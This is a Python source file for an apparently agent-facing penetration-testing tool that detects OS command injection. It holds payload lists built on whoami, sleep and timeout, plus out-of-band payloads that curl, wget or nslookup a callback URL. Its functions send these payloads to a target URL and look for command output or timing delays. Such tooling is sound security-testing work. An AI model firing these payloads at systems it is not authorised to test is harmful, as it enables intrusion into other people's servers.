"""Command injection testing tool."""

from __future__ import annotations

import time
from typing import Any, Literal

import requests

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)


CommandInjectionAction = Literal["test_basic", "test_blind", "generate_payload", "test_endpoint"]


# Command injection payloads
BASIC_PAYLOADS = [
    "; whoami",
    "| whoami",
    "|| whoami",
    "& whoami",
    "&& whoami",
    "`whoami`",
    "$(whoami)",
    "\n whoami",
]

# Blind command injection payloads (time-based)
BLIND_PAYLOADS = {
    "linux": [
        "; sleep 5",
        "| sleep 5",
        "|| sleep 5 ||",
        "& sleep 5",
        "&& sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
    ],
    "windows": [
        "& timeout 5",
        "| timeout 5",
        "|| timeout 5",
        "&& timeout 5",
        "& ping -n 6 127.0.0.1",
    ],
}

# OOB (out-of-band) payloads
def _generate_oob_payloads(callback_url: str) -> list[str]:
    """Generate OOB command injection payloads."""
    return [
        f"; curl {callback_url}",
        f"| curl {callback_url}",
        f"&& curl {callback_url}",
        f"`curl {callback_url}`",
        f"$(curl {callback_url})",
        f"; wget {callback_url}",
        f"| wget {callback_url}",
        f"&& wget {callback_url}",
        f"; nslookup {callback_url}",
        f"| nslookup {callback_url}",
    ]


def _test_blind_injection(url: str, param_name: str, os_type: str = "linux", timeout: int = 15) -> dict[str, Any]:
    """Test blind command injection using timing."""
    results = {
        "vulnerable": False,
        "tests": []
    }
    
    payloads = BLIND_PAYLOADS.get(os_type, BLIND_PAYLOADS["linux"])
    
    # Baseline timing
    baseline_times = []
    for _ in range(3):
        try:
            start = time.time()
            requests.get(f"{url}?{param_name}=test", timeout=timeout)
            baseline_times.append(time.time() - start)
        except requests.exceptions.RequestException:
            pass
    
    baseline = sum(baseline_times) / len(baseline_times) if baseline_times else 0
    
    for payload in payloads:
        test_result = {
            "payload": payload,
            "os_type": os_type
        }
        
        try:
            start = time.time()
            response = requests.get(
                f"{url}?{param_name}={payload}",
                timeout=timeout,
                allow_redirects=False
            )
            elapsed = time.time() - start
            
            test_result["elapsed_time"] = elapsed
            test_result["baseline"] = baseline
            test_result["difference"] = elapsed - baseline
            
            # If response took significantly longer (>4 seconds more than baseline)
            if elapsed - baseline > 4:
                test_result["indicator"] = "Timing delay detected"
                results["vulnerable"] = True
            
        except requests.exceptions.Timeout:
            test_result["indicator"] = "Request timed out (possible injection)"
            results["vulnerable"] = True
        except requests.exceptions.RequestException as e:
            test_result["error"] = str(e)
        
        results["tests"].append(test_result)
    
    return results


def _test_basic_injection(url: str, param_name: str, timeout: int = 10) -> dict[str, Any]:
    """Test basic command injection with output."""
    results = {
        "vulnerable": False,
        "tests": []
    }
    
    for payload in BASIC_PAYLOADS:
        test_result = {
            "payload": payload,
            "indicators": []
        }
        
        try:
            response = requests.get(
                f"{url}?{param_name}={payload}",
                timeout=timeout,
                allow_redirects=False
            )
            
            test_result["status_code"] = response.status_code
            test_result["response_length"] = len(response.text)
            
            # Check for command output indicators
            response_lower = response.text.lower()
            
            # Unix user output patterns
            if any(pattern in response_lower for pattern in ["uid=", "gid=", "groups=", "/bin/bash", "/bin/sh"]):
                test_result["indicators"].append("Unix user/shell output detected")
                results["vulnerable"] = True
            
            # Windows user output patterns
            if any(pattern in response_lower for pattern in ["nt authority", "c:\\windows", "c:\\users"]):
                test_result["indicators"].append("Windows system output detected")
                results["vulnerable"] = True
            
            # Generic command output
            if "root" in response_lower or "administrator" in response_lower:
                test_result["indicators"].append("Privileged user output detected")
                results["vulnerable"] = True
            
        except requests.exceptions.RequestException as e:
            test_result["error"] = str(e)
        
        results["tests"].append(test_result)
    
    return results


def _generate_command_injection_payload(
    command: str = "whoami",
    operator: str = ";",
    encoding: str = "none"
) -> list[str]:
    """Generate command injection payloads."""
    payloads = [
        f"{operator} {command}",
        f"{operator}{command}",
    ]
    
    # Add operator variations
    operators = [";", "|", "||", "&", "&&", "\n"]
    for op in operators:
        payloads.append(f"{op} {command}")
    
    # Add execution variations
    payloads.extend([
        f"`{command}`",
        f"$({command})",
        f"${{IFS}}{command}",
    ])
    
    # Add encoding variations
    if encoding == "url":
        import urllib.parse
        payloads = [urllib.parse.quote(p) for p in payloads]
    elif encoding == "double_url":
        import urllib.parse
        payloads = [urllib.parse.quote(urllib.parse.quote(p)) for p in payloads]
    
    return payloads


@register_tool
def command_injection_tester(
    action: CommandInjectionAction,
    url: str | None = None,
    param_name: str = "cmd",
    command: str = "whoami",
    os_type: str = "linux",
    callback_url: str | None = None,
    operator: str = ";",
    timeout: int = 15
) -> str:
    """Test for OS command injection vulnerabilities.
    
    Tests various command injection techniques including basic injection,
    blind injection (time-based), and OOB (out-of-band) verification.
    
    Args:
        action: Action to perform
            - test_basic: Test basic command injection with output
            - test_blind: Test blind injection using timing
            - generate_payload: Generate command injection payloads
            - test_endpoint: Test specific endpoint with payload
        url: Target URL for testing
        param_name: Parameter name to test (default: cmd)
        command: Command to execute (default: whoami)
        os_type: Operating system type (linux, windows)
        callback_url: Callback URL for OOB verification
        operator: Command chaining operator (;, |, &, etc.)
        timeout: Request timeout in seconds
    
    Returns:
        Test results or generated payload
    """
    if action == "test_basic":
        if not url:
            return "Error: URL required for testing"
        
        results = _test_basic_injection(url, param_name, timeout)
        
        output = ["Basic Command Injection Test", "=" * 50, ""]
        output.append(f"Target: {url}")
        output.append(f"Parameter: {param_name}")
        output.append(f"Vulnerable: {results['vulnerable']}")
        output.append("")
        
        for test in results["tests"]:
            output.append(f"\nPayload: {test['payload']}")
            if "error" in test:
                output.append(f"  Error: {test['error']}")
            else:
                output.append(f"  Status: {test.get('status_code', 'N/A')}")
                output.append(f"  Response Length: {test.get('response_length', 0)}")
                if test["indicators"]:
                    output.append("  Indicators:")
                    for indicator in test["indicators"]:
                        output.append(f"    ✓ {indicator}")
        
        return "\n".join(output)
    
    elif action == "test_blind":
        if not url:
            return "Error: URL required for testing"
        
        results = _test_blind_injection(url, param_name, os_type, timeout)
        
        output = ["Blind Command Injection Test (Time-Based)", "=" * 50, ""]
        output.append(f"Target: {url}")
        output.append(f"Parameter: {param_name}")
        output.append(f"OS Type: {os_type}")
        output.append(f"Vulnerable: {results['vulnerable']}")
        output.append("")
        
        for test in results["tests"]:
            output.append(f"\nPayload: {test['payload']}")
            if "error" in test:
                output.append(f"  Error: {test['error']}")
            elif "indicator" in test:
                output.append(f"  ✓ {test['indicator']}")
                if "elapsed_time" in test:
                    output.append(f"  Elapsed: {test['elapsed_time']:.2f}s")
                    output.append(f"  Baseline: {test['baseline']:.2f}s")
                    output.append(f"  Difference: {test['difference']:.2f}s")
            else:
                if "elapsed_time" in test:
                    output.append(f"  Elapsed: {test['elapsed_time']:.2f}s")
                    output.append(f"  Baseline: {test['baseline']:.2f}s")
                    output.append(f"  Difference: {test['difference']:.2f}s")
        
        if results["vulnerable"]:
            output.append("")
            output.append("⚠ Timing-based blind command injection detected!")
        
        return "\n".join(output)
    
    elif action == "generate_payload":
        payloads = _generate_command_injection_payload(command, operator)
        
        output = ["Generated Command Injection Payloads", "=" * 50, ""]
        output.append(f"Command: {command}")
        output.append(f"Primary Operator: {operator}")
        output.append("")
        output.append("Payloads:")
        
        for i, payload in enumerate(payloads, 1):
            output.append(f"{i}. {payload}")
        
        if callback_url:
            output.append("")
            output.append("Out-of-Band (OOB) Payloads:")
            oob_payloads = _generate_oob_payloads(callback_url)
            for i, payload in enumerate(oob_payloads, 1):
                output.append(f"{i}. {payload}")
        
        output.append("")
        output.append("Usage Tips:")
        output.append("  • Test in GET parameters, POST data, headers, cookies")
        output.append("  • Try URL encoding if payload is filtered")
        output.append("  • Use timing-based detection for blind injection")
        output.append("  • Use OOB techniques when output is not reflected")
        
        return "\n".join(output)
    
    elif action == "test_endpoint":
        if not url:
            return "Error: URL required for testing"
        
        payloads = _generate_command_injection_payload(command, operator)
        
        output = ["Command Injection Endpoint Test", "=" * 50, ""]
        output.append(f"URL: {url}")
        output.append(f"Parameter: {param_name}")
        output.append(f"Command: {command}")
        output.append("")
        
        for i, payload in enumerate(payloads[:5], 1):  # Test first 5 payloads
            output.append(f"\nTesting payload {i}: {payload}")
            
            try:
                response = requests.get(
                    f"{url}?{param_name}={payload}",
                    timeout=timeout,
                    allow_redirects=False
                )
                
                output.append(f"  Status: {response.status_code}")
                output.append(f"  Length: {len(response.text)}")
                
                # Check for indicators
                response_lower = response.text.lower()
                if any(p in response_lower for p in ["uid=", "gid=", "root", "administrator"]):
                    output.append("  ✓ Command output detected!")
                    output.append(f"  Preview: {response.text[:200]}")
                
            except requests.exceptions.RequestException as e:
                output.append(f"  Error: {str(e)}")
        
        return "\n".join(output)
    
    return "Invalid action. Use: test_basic, test_blind, generate_payload, test_endpoint"
